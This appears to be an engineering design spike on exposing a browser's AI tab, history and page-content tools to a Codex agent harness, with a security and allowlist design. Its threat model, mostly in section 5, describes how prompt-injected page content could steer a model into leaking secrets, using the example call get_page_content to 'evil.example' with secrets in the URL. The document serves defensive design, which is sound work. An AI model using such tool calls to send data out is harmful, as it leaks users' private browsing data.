# Spike: reusing Smart Window's browser tools as Codex dynamic tools

Status: research spike, no code. Investigates whether the harness can expose
Smart Window's AI tools (tabs, history, page content) to the Codex sidecar as
client-hosted dynamic tools. Protocol shapes below were verified against the
pinned `openai/codex` `rust-v0.145.0` sources (`app-server-protocol`).

## 1. What Smart Window's tool system looks like

Smart Window ("AI Window", pref `browser.smartwindow.enabled`) lives in
`browser/components/aiwindow/`. Its tool layer:

- **Registry + schemas**: `browser/components/aiwindow/models/Tools.sys.mjs`.
  `toolsConfig` is an array of OpenAI function-calling schemas; `toolFns` maps
  names to implementations. Tool names are exported constants:
  `GET_OPEN_TABS`, `SEARCH_BROWSING_HISTORY`, `GET_PAGE_CONTENT`, `RUN_SEARCH`,
  `GET_USER_MEMORIES`, `GET_NAVIGATION_INFO`, `MANAGE_TABS`, `ADD_MEMORY`,
  plus pref-gated `WORLD_CUP_*` (`browser.smartwindow.worldcup.enabled`).
- **Dispatch**: `browser/components/aiwindow/models/Chat.sys.mjs`
  `executeToolByName()` — a switch over tool names inside the streaming chat
  loop (`fetchWithHistory`), with per-call Glean telemetry and per-turn limits
  (e.g. `MAX_RUN_SEARCH_PER_TURN = 3`).
- **What they can do / depend on**:
  - `get_open_tabs`: enumerates `BrowserWindowTracker.orderedWindows` →
    `gBrowser.tabs`; http(s)-only (`ALLOWED_URL_PROTOCOLS`), hard cap
    `MAX_TABS = 30` (comment: security review required to change), titles
    passed through `sanitizeUntrustedContent()` (`ChatUtils.sys.mjs`:
    truncate to 100 chars + "spotlighting" quotes marking untrusted data).
  - `search_browsing_history`: `SearchBrowsingHistory.sys.mjs` over Places
    semantic search (`PlacesSemanticHistoryManager`, `PlacesUtils`), cap
    `MAX_HISTORY_RESULTS = 15`.
  - `get_page_content`: `GetPageContent` class → the **generic toolkit actor**
    `PageExtractor` (`toolkit/components/pageextractor/PageExtractorParent.sys.mjs`,
    registered in `toolkit/modules/ActorManagerParent.sys.mjs`): `getText()`
    on a live tab's window context, or `getHeadlessExtractor()` (hidden-frame
    fetch, optional `anonymousFetch`) for non-open URLs. 10k char cap.
  - `run_search`: drives the real browser UI (navigates the user's tab to the
    default-engine SERP, waits, extracts). Deeply tied to `AIWindow.sys.mjs`
    (sidebar move, searching indicator).
  - `manage_tabs`: `ManageTabs.sys.mjs` (`TAB_ACTIONS = close_tabs |
    group_tabs`) with a UI confirmation flow (`uiData` attached to the chat
    message; `addUIToolToCurrentMessage`).
  - memories tools: `MemoriesManager.sys.mjs`; `get_navigation_info`:
    `SmartWindowNavigationInfo.sys.mjs` (static prefs metadata).
- **Security machinery** (the interesting part):
  - `SecurityProperties.sys.mjs`: per-conversation sticky taint flags
    `privateData` / `untrustedInput` (staged, `commit()` per tool batch,
    never clearable). `GetPageContent` enforces a decision table: once the
    conversation holds *both* private data and untrusted input, headless
    fetches of arbitrary URLs are **blocked** (anti-exfiltration); tab reads
    and user-mentioned URLs stay allowed; SERP links get `anonymousFetch`.
  - **URL tokens**: the model never sees raw URLs — they are rewritten to
    `§url_token: DOMAIN_TLD_PATH_n§` per conversation, and tool args are
    expanded back via `expandUrlTokensInToolParams()` (`ChatUtils.sys.mjs`),
    so the model cannot synthesize an exfiltration URL that a tool will fetch.

## 2. Separability verdict: not cleanly, but the primitives are

Every tool takes a `ChatConversation`
(`browser/components/aiwindow/ui/modules/ChatConversation.sys.mjs`) and uses
its `securityProperties`, `addSeenUrls()`, `getAllMentionURLs()`,
`serpUrlsForAnonymousFetch`, `addHistoryResults()` and telemetry fields.
`get_open_tabs` and `GetPageContent.getTabWithURL()` additionally filter to
`AIWindow.isAIWindowActive(win)` windows only — reused verbatim in the
harness they would return *nothing* unless a Smart Window is open. `run_search`
and `manage_tabs` are inseparable from the AI Window UI. Importing
`Tools.sys.mjs` also drags in ChatStore/Glean/AIWindow.

However, the tools are thin wrappers: the underlying primitives are already
generic and Smart-Window-free — `PageExtractorParent` (toolkit),
`PlacesSemanticHistoryManager` (toolkit), `BrowserWindowTracker`/`gBrowser`.
**Recommendation: do not import `Tools.sys.mjs`. Implement 2–3 harness-native
tools against the same primitives**, copying the schema text, caps
(`MAX_TABS`, `MAX_HISTORY_RESULTS`) and `sanitizeUntrustedContent()`
verbatim, with a code comment crediting the source so the two can later be
unified (minimal upstream extraction: move `sanitizeUntrustedContent` + the
caps into a shared `browser/components/` or toolkit module).

## 3. Protocol mechanics: dynamic tools in codex 0.145.0 (verified)

- **Declaration** — `thread/start` only. `ThreadStartParams.dynamicTools:
  DynamicToolSpec[]` (`v2/thread.rs`), gated
  `#[experimental("thread/start.dynamicTools")]`. The harness already opts in:
  `CodexAppServerClient.start()` sends `capabilities: { experimentalApi:
  true }` on `initialize` (it already uses experimental `environment/add`).
  `TurnStartParams` has **no** dynamic-tools field, and neither does
  `ThreadResumeParams` — resumed threads cannot re-declare tools (open
  question below).
- **`DynamicToolSpec`** (wire camelCase, from the generated
  `ThreadStartParams` JSON schema):
  - `{ type: "function", name, description, inputSchema: <JSON Schema>,
    deferLoading?: bool }`
  - or `{ type: "namespace", name, description, tools:
    DynamicToolNamespaceTool[] }`
- **Invocation** — server→client request `item/tool/call`
  (`ClientRequest::DynamicToolCall`, `common.rs`):
  - params `DynamicToolCallParams { threadId, turnId, callId,
    namespace: string|null, tool, arguments: <json> }`
  - response `DynamicToolCallResponse { contentItems:
    DynamicToolCallOutputContentItem[], success: bool }`
  - content items: `{ type: "inputText", text }` | `{ type: "inputImage",
    imageUrl }` | `{ type: "inputAudio", audioUrl }`.
- **Progress events** — `item/started` / `item/completed` notifications carry
  `ThreadItem::DynamicToolCall { id, namespace, tool, arguments, status:
  inProgress|completed|failed, contentItems, success, durationMs }`.
  `AgentService._onNotification` already forwards non-message items as
  `{type:"item"}` events, so about:harness can render tool calls with no
  protocol work.
- Related but optional: `item/tool/requestUserInput`
  (`ToolRequestUserInput`) lets a tool ask the user structured questions
  mid-call.

## 4. Integration architecture

```
codex-app-server ── item/tool/call ──► CodexAppServerClient
                                            │ onServerRequest
                                            ▼
                                   AgentService._onServerRequest
                                     ├─ APPROVAL_METHODS → approval UI (unchanged)
                                     ├─ "item/tool/call" → HarnessBrowserTools.dispatch()
                                     │      • allowlist: registered names only
                                     │      • schema-validate arguments
                                     │      • audit log (CodexExecBridge-style)
                                     │      • PageExtractor / Places / gBrowser
                                     │      • large results → staged into
                                     │        /workspace/.browser/ via HarnessVM
                                     └─ everything else → throw (fail closed)
```

`AgentService.createConversation()` adds `params.dynamicTools =
HarnessBrowserTools.specs()` next to the existing `params.environments`
wiring, behind a new pref (`browser.harness.browserTools.enabled`).

## 5. Security / allowlist design

Invariants preserved: tools run in the parent but are **read-only**; the
no-host-execution invariant is untouched (exec/fs still go through
`CodexExecBridge` into the VM).

- **Fail-closed stays the default.** `_onServerRequest` grows exactly one new
  accepted method; unknown tool names / namespaces inside `item/tool/call`
  return `{ success: false }` with an error text and an `"error"` audit
  verdict.
- **Per-tool allowlist**: only tools in the harness registry are declared at
  `thread/start`, and dispatch re-checks the name (never trust the sidecar to
  only call declared tools). Optional per-tool prefs / settings toggles.
- **Arguments are attacker-influenced** (model output downstream of hostile
  page content): validate against the tool's own `inputSchema`, http(s)-only
  URL allowlist, hard caps copied from Tools.sys.mjs.
- **No arbitrary-URL fetch in v1.** This is the key difference from Smart
  Window: a headless-fetch tool would hand a prompt-injected model a network
  egress channel (`get_page_content("https://evil.example/?<secrets>")`).
  Smart Window needs its SecurityProperties decision table because it offers
  that; harness v1 simply restricts `get_page_content` to *already-open tabs*
  (no new network), making the taint table unnecessary initially. If headless
  fetch is added later, port `SecurityProperties` + the URL-token scheme.
- **Result flow — inline vs staged**: tab lists / history metadata (bounded,
  `sanitizeUntrustedContent`-treated) return inline as one `inputText` item.
  Page-content extractions (up to ~10k chars of hostile text) are staged as
  files under `/workspace/.browser/page-<n>.md` via `HarnessVM`, returning a
  short inline summary + guest path; the model then reads/greps it with
  sandboxed VM tooling, keeping bulk hostile content out of the parent-side
  transcript and audit log.
- **Audit**: mirror `CodexExecBridge._audit` — ring-buffered
  `{ timeMs, method: "tool/<name>", detail, verdict }` entries (same
  `AUDIT_LOG_LIMIT` pattern), surfaced in about:harness alongside the exec
  audit log. Every call is logged including denials and argument summaries
  (URLs, counts — not full page text).
- **Future mutating tools** (manage_tabs-style) must route through the
  existing `approvalRequest` UI path before executing; not in v1.

## 6. Implementation sketch (ordered)

1. `codex/HarnessBrowserTools.sys.mjs`: registry of
   `{ name, description, inputSchema, handler }` for `get_open_tabs`,
   `get_page_content` (open tabs only), `search_browsing_history`; built on
   `PageExtractorParent`, `PlacesSemanticHistoryManager`,
   `BrowserWindowTracker`; copy caps + sanitizer from
   `aiwindow/models/Tools.sys.mjs` / `ChatUtils.sys.mjs`.
2. `AgentService.createConversation`: pass `dynamicTools` on `thread/start`
   behind `browser.harness.browserTools.enabled`.
3. `AgentService._onServerRequest`: handle `item/tool/call` before the
   approval branch; validate → dispatch with a timeout → map result/exception
   to `DynamicToolCallResponse`.
4. Audit log + about:harness rendering of `dynamicToolCall` items (item
   events already flow) and the tool audit list.
5. Staged-result mode: write extractions into the VM workspace via
   `HarnessVM`, return guest path inline.
6. Tests: xpcshell for registry validation/allowlist/deny paths; mochitest
   with the mock-sidecar pattern used by existing harness tests.

## 7. Open questions

- **thread/resume has no `dynamicTools`** in 0.145.0 — do rollout files
  persist tool specs, or do resumed threads silently lose tools? Needs an
  empirical check; may force "new conversation only" for tools, or a sidecar
  bump.
- `deferLoading` semantics (schema is undocumented in 0.145.0) — worth using
  to keep per-turn prompt cost down?
- Should the harness adopt the URL-token indirection now, or only when/if a
  fetching tool arrives? (v1 tools expose raw URLs of open tabs to the model.)
- Namespace spec (`type: "namespace"`) vs flat function list — namespacing
  as `browser.*` would leave room for future `vm.*` client tools.
- Model quality: local ollama models may handle dynamic tools poorly;
  probably gate the tool declaration on provider/model.
- Longer term: converge with Smart Window by extracting the sanitizer/caps
  into a shared module so both surfaces stay security-reviewed together.
